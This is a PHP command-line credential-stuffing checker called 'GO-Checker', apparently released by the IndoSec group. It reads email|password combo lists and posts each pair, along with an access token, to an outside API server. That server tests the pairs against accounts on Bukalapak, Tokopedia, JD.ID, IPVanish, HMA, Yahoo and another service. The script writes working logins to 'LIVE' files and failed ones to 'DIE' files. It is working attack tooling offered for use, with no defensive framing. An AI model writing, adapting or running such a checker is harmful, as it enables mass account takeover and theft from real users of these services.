<?php 
	/*
		GO-Checker
		Author : Minicode ft. Brilly4n
		{ IndoSec }
		Contact : https://facebook.com/IndoSecOfficial
	*/

	/*
		Jangan Di Utak Atik kalo gk mau error gan :)
	*/

	error_reporting(0);
	require('token.php');
	
	if ($token == "") {
		echo "\n\n[-] TIDAK ADA TOKEN, SILAHKAN CHAT KAMI DI FANSPAGE INDOSEC [-]\n[+] https://fb.com/IndoSecOfficial\n\n";
		exit();
	}

	// SERVER
	$server = "http://mytools.mohona.tv/api/";

	function banner()
	{
		echo "
 _____             _____      _             
|  __ \           /  __ \    | |            
| |  \/ ___ ______| /  \/ ___| | _____ _ __ 
| | __ / _ \______| |    / _ \ |/ / _ \ '__|
| |_\ \ (_) |     | \__/\  __/   <  __/ |   
 \____/\___/       \____/\___|_|\_\___|_|  v.1.1

 https://www.facebook.com/IndoSecOfficial
";
	}

	function post($pilihan, $email, $pass, $token, $server, $file_txt, $die_txt)
	{	
		
		// function curl_data($params, $server, $data, $file_txt, $die_txt)
		// {
		// 	$ch = curl_init();
		// 	curl_setopt($ch, CURLOPT_URL, $server.$params);
		// 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		// 	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		// 	$x = curl_exec($ch);
		// 	curl_close($ch);
		// 	$result = json_decode($x);
		// 	if ($result->status == 'success') {
		// 		$o = fopen($file_txt, 'a');
		// 		fwrite($o, $result->data);
		// 		fclose($o);
		// 		echo $result->data;
		// 	}else{
		// 		$o = fopen($die_txt, 'a');
		// 		fwrite($o, $result->data);
		// 		fclose($o);
		// 		echo $result->data;
		// 	}
		// }

		$data = "email=$email&pass=$pass&token=$token";
		if ($pilihan == 2) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $server.'bl');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			$x = curl_exec($ch);
			curl_close($ch);
			$result = json_decode($x);
			if ($result->status == 'success') {
				$o = fopen($file_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}elseif($result->status == 'error'){
				$o = fopen($die_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}else{
				echo $x;
				exit();
			}
		}elseif($pilihan == 1){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $server.'phd');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			$x = curl_exec($ch);
			curl_close($ch);
			$result = json_decode($x);
			if ($result->status == 'success') {
				$o = fopen($file_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}elseif($result->status == 'error'){
				$o = fopen($die_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}else{
				echo $x;
				exit();
			}
		}elseif($pilihan == 3){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $server.'tokopedia');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			$x = curl_exec($ch);
			curl_close($ch);
			$result = json_decode($x);
			if ($result->status == 'success') {
				$o = fopen($file_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}elseif($result->status == 'error'){
				$o = fopen($die_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}else{
				echo $x;
				exit();
			}
			sleep(1);
		}elseif($pilihan == 4){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $server.'jdid');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			$x = curl_exec($ch);
			curl_close($ch);
			$result = json_decode($x);
			if ($result->status == 'success') {
				$o = fopen($file_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}elseif($result->status == 'error'){
				$o = fopen($die_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}else{
				echo $x;
				exit();
			}
			sleep(1);
		}elseif($pilihan == 5){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $server.'ipvanish');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			$x = curl_exec($ch);
			curl_close($ch);
			$result = json_decode($x);
			if ($result->status == 'success') {
				$o = fopen($file_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}elseif($result->status == 'error'){
				$o = fopen($die_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}else{
				echo $x;
				exit();
			}	
		}elseif($pilihan == 6){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $server.'hma');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			$x = curl_exec($ch);
			curl_close($ch);
			$result = json_decode($x);
			if ($result->status == 'success') {
				$o = fopen($file_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}elseif($result->status == 'error'){
				$o = fopen($die_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}else{
				echo $x;
				exit();
			}	
		}elseif($pilihan == 20){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $server.'yahoo');
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			$x = curl_exec($ch);
			curl_close($ch);
			$result = json_decode($x);
			if ($result->status == 'success') {
				$o = fopen($file_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}elseif($result->status == 'error'){
				$o = fopen($die_txt, 'a');
				fwrite($o, $result->data);
				fclose($o);
				echo $result->data;
			}else{
				echo $x;
				exit();
			}
			sleep(1);
		}
	}

	function pilihan()
	{
		echo "\n[+] (1).PHD (2).Bukalapak (3).Tokopedia (4) JD.ID";
		echo "\n[+] (5).IpVanish (6).HMA";
		echo "\n[+] (20).Yahoo Valid Email \n";
		echo "\n[+] (99). Mass Hashing (Ultra Hash) \n\n";
	}

	banner();
	pilihan();

	echo " > Masukan Pilihan Checker : ";
	$pilihan = trim(fgets(STDIN));

	if ($pilihan == 6) {
		echo "\n[+] Example list : CWHKLB-U73H82-5KU7M1\n";
	}elseif($pilihan == 99){
		echo "\n[+] Example list : email|pass\n[+] Support Semua Hash\n";
	}

	echo "\n > Masukan List.txt : ";
	$list = trim(fgets(STDIN));
	
	echo "\n[+] Loading....\n\n";

	if (file_exists($list)) {

		$files = file_get_contents($list);
		$file = explode("\r\n", $files);

		if ($pilihan == 99) {
			require('hashit.php');
			
			$file = file_get_contents($list);
			$files = explode("\r\n", $file);
			foreach ($files as $key) {
				
				$pass = explode("|", $key);
				$panjang = strlen($pass[1]);
				
				hashit($pass[1], $panjang);
			
			}
			echo "\n\n";
			exit();
		}

		$rand = date('dmY_His');
		if ($pilihan == 2) {

			$file_txt = 'BL_LIVE_'.$rand.'.txt';
			$die_txt = 'BL_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 1){

			$file_txt = 'PHD_LIVE_'.$rand.'.txt';
			$die_txt = 'PHD_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 3){

			$file_txt = 'TOKPED_LIVE_'.$rand.'.txt';
			$die_txt = 'TOKPED_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 4){

			$file_txt = 'JDID_LIVE_'.$rand.'.txt';
			$die_txt = 'JDID_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 5){

			$file_txt = 'IPVANISH_LIVE_'.$rand.'.txt';
			$die_txt = 'IPVANISH_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 6){

			$file_txt = 'HMA_LIVE_'.$rand.'.txt';
			$die_txt = 'HMA_DIE_'.$rand.'.txt';	
		}elseif($pilihan == 20){

			$file_txt = 'YAHOO_LIVE_'.$rand.'.txt';
			$die_txt = 'YAHOO_DIE_'.$rand.'.txt';	
		}

		
		echo "\n[+] Your ID : ".$rand." \n[+] File $file_txt | $die_txt Created !\n\n";

		$open = touch($file_txt);

		foreach ($file as $key) {
			
			$user = explode("|", $key);

			post($pilihan, $user[0], $user[1], $token, $server, $file_txt, $die_txt);
		}
	}else{
		echo "\n[-] FILE TIDAK ADA \n\n";
		exit();
	}

?>